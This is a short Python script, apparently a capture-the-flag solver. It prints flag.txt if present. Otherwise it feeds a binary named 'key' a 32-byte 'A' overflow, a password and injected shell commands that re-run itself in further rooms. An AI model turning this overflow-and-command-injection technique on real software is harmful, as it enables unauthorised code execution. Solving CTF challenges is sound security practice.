import os
from subprocess import Popen, PIPE, DEVNULL
import sys


def main():
    sys.stderr.write(".")

    if os.path.exists("flag.txt"):
        with open("flag.txt") as f:
            sys.stderr.write(f.read())
        return

    if os.path.exists("key"):
        payload = b"A" * 32 + b"p4ssw0rd\n"

        proc = Popen(["./key"], stdin=PIPE, stdout=DEVNULL)
        proc.communicate(payload + b"cd room0 && exec python3 /tmp/solve.py")

        proc = Popen("./key", stdin=PIPE, stdout=DEVNULL)
        proc.communicate(payload + b"cd room1 && exec python3 /tmp/solve.py")


main()
